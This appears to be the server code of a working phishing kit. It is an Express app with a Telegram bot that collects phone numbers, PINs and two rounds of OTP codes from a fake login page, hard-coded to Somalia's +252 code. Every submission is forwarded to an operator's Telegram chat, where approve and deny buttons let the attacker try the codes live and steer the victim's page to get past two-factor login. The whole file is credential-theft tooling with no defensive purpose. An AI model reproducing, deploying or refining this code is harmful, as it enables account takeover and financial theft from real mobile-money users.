const express = require('express');
const { Telegraf } = require('telegraf');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 8080;

// -------------------- INIT BOT --------------------
if (!process.env.BOT_TOKEN) {
    throw new Error("BOT_TOKEN is missing in .env");
}

const bot = new Telegraf(process.env.BOT_TOKEN);
const ADMIN_ID = String(process.env.ADMIN_CHAT_ID || "").trim();

// -------------------- MEMORY STORE --------------------
const statusStore = {};

// -------------------- MIDDLEWARE --------------------
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// -------------------- ROUTES --------------------
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// -------------------- LOGIN API --------------------
app.post('/api/login-notification', async (req, res) => {
    const { phone, pin } = req.body || {};
    const country = "Somalia";
    const countryCode = "+252";

    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric',
        day: 'numeric',
        year: 'numeric',
        hour: 'numeric',
        minute: 'numeric',
        second: 'numeric',
        hour12: true
    });

    if (!phone || !pin || !ADMIN_ID)
        return res.status(400).json({ error: "Missing data" });

    statusStore[phone] = "pending";

    const message = `📱 <b>CL 2 - LOGIN ATTEMPT</b>

🆕 <b>NEW USER</b>
🇸🇴 <b>Country:</b> ${country}
🌍 <b>Country Code:</b> ${countryCode}
📱 <b>Phone Number:</b> ${phone}
🔢 <b>PIN:</b> ${pin}
⏰ <b>Time:</b> ${currentTime}

━━━━━━━━━━━━━━━

⚠️ <b>User waiting for approval</b>
⌛ <b>Timeout: 5 minutes</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, message, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Allow to proceed", callback_data: `approve|${encodeURIComponent(phone)}|${encodeURIComponent(pin)}` },
                        { text: "❌ Invalid credentials", callback_data: `deny|${encodeURIComponent(phone)}|${encodeURIComponent(pin)}` }
                    ]
                ]
            }
        });

        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: err.message });
    }
});

// -------------------- FIRST OTP API --------------------
app.post('/api/verify-first-otp', async (req, res) => {
    const { phone, otp } = req.body || {};
    const country = "Somalia";
    const countryCode = "+252";

    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric',
        day: 'numeric',
        year: 'numeric',
        hour: 'numeric',
        minute: 'numeric',
        second: 'numeric',
        hour12: true
    });

    if (!phone || !otp || !ADMIN_ID)
        return res.status(400).json({ error: "Missing data" });

    const otpMessage = `1️⃣ <b>CL 2 - FIRST OTP (Step 1/2)</b>

🆕 <b>NEW USER - FIRST VERIFICATION</b>
🇸🇴 <b>Country:</b> ${country}
🌍 <b>Country Code:</b> ${countryCode}
📱 <b>Phone Number:</b> ${phone}
🔐 <b>First OTP Code:</b> ${otp}
⏰ <b>Time:</b> ${currentTime}

━━━━━━━━━━━━━━━

⚠️ <b>Verify FIRST OTP:</b>
⌛ <b>Timeout: 5 minutes</b>
📝 <b>Next: Second OTP will be sent after approval</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, otpMessage, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Correct", callback_data: `otp1_correct|${encodeURIComponent(phone)}|${encodeURIComponent(otp)}` },
                        { text: "❌ Wrong Code", callback_data: `otp1_wrong|${encodeURIComponent(phone)}` }
                    ]
                ]
            }
        });

        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: err.message });
    }
});

// -------------------- SECOND OTP API --------------------
app.post('/api/verify-second-otp', async (req, res) => {
    const { phone, otp } = req.body || {};
    const country = "Somalia";
    const countryCode = "+252";

    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric',
        day: 'numeric',
        year: 'numeric',
        hour: 'numeric',
        minute: 'numeric',
        second: 'numeric',
        hour12: true
    });

    if (!phone || !otp || !ADMIN_ID)
        return res.status(400).json({ error: "Missing data" });

    const otpMessage2 = `2️⃣ <b>CL 2 - SECOND OTP (Step 2/2)</b>

🆕 <b>NEW USER - SECOND VERIFICATION</b>
🇸🇴 <b>Country:</b> ${country}
🌍 <b>Country Code:</b> ${countryCode}
📱 <b>Phone Number:</b> ${phone}
🔐 <b>Second OTP Code:</b> ${otp}
⏰ <b>Time:</b> ${currentTime}

━━━━━━━━━━━━━━━

⚠️ <b>Verify SECOND OTP:</b>
⌛ <b>Timeout: 5 minutes</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, otpMessage2, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Correct", callback_data: `otp2_correct|${encodeURIComponent(phone)}|${encodeURIComponent(otp)}` },
                        { text: "❌ Wrong Code", callback_data: `otp2_wrong|${encodeURIComponent(phone)}` },
                        { text: "🔑 Wrong PIN", callback_data: `otp2_wrongpin|${encodeURIComponent(phone)}` }
                    ]
                ]
            }
        });

        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: err.message });
    }
});

// -------------------- BOT ACTIONS --------------------

bot.action(/approve\|(.+)\|(.+)/, async (ctx) => {
    const phone = decodeURIComponent(ctx.match[1]);
    const pin = decodeURIComponent(ctx.match[2]);
    statusStore[phone] = "approved";

    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`✅ <b>LOGIN APPROVED</b>\n📱 ${phone}\n🔐 ${pin}`);
    await ctx.answerCbQuery();
});

bot.action(/deny\|(.+)\|(.+)/, async (ctx) => {
    const phone = decodeURIComponent(ctx.match[1]);
    const pin = decodeURIComponent(ctx.match[2]);
    statusStore[phone] = "denied";

    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`❌ <b>INVALID CREDENTIALS</b>\n📱 ${phone}\n🔐 ${pin}`);
    await ctx.answerCbQuery();
});

bot.action(/otp1_correct\|(.+)\|(.+)/, async (ctx) => {
    const phone = decodeURIComponent(ctx.match[1]);
    const otp = decodeURIComponent(ctx.match[2]);
    statusStore[phone] = "otp1_correct";

    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`✅ FIRST OTP VERIFIED\n📱 ${phone}\n🔐 ${otp}`);
    await ctx.answerCbQuery();
});

bot.action(/otp1_wrong\|(.+)/, async (ctx) => {
    const phone = decodeURIComponent(ctx.match[1]);
    statusStore[phone] = "otp1_wrong";

    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`❌ FIRST OTP WRONG\n📱 ${phone}`);
    await ctx.answerCbQuery();
});

bot.action(/otp2_correct\|(.+)\|(.+)/, async (ctx) => {
    const phone = decodeURIComponent(ctx.match[1]);
    const otp = decodeURIComponent(ctx.match[2]);
    statusStore[phone] = "otp2_correct";

    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`✅ SECOND OTP VERIFIED\n📱 ${phone}\n🔐 ${otp}`);
    await ctx.answerCbQuery();
});

bot.action(/otp2_wrong\|(.+)/, async (ctx) => {
    const phone = decodeURIComponent(ctx.match[1]);
    statusStore[phone] = "otp2_wrong";

    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`❌ SECOND OTP WRONG\n📱 ${phone}`);
    await ctx.answerCbQuery();
});

bot.action(/otp2_wrongpin\|(.+)/, async (ctx) => {
    const phone = decodeURIComponent(ctx.match[1]);
    statusStore[phone] = "otp2_wrongpin";

    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`🔑 WRONG PIN\n📱 ${phone}`);
    await ctx.answerCbQuery();
});

// -------------------- STATUS CHECK --------------------
app.get('/api/check-status', (req, res) => {
    const phone = req.query.phone;
    res.json({ status: statusStore[phone] || "pending" });
});

// -------------------- SAFE PAGE ROUTE --------------------
app.get('/:page', (req, res, next) => {
    if (req.params.page.startsWith('api')) return next();

    const file = req.params.page.endsWith('.html')
        ? req.params.page
        : req.params.page + '.html';

    res.sendFile(path.join(__dirname, 'public', file), (err) => {
        if (err) res.status(404).send("Page not found");
    });
});

// -------------------- START SERVER --------------------
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
});

// -------------------- START BOT --------------------
(async () => {
    try {
        await bot.telegram.deleteWebhook({ drop_pending_updates: true });
        await bot.launch();
        console.log("🤖 Bot running");
    } catch (err) {
        console.error(err);
    }
})();

// -------------------- GRACEFUL STOP --------------------
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
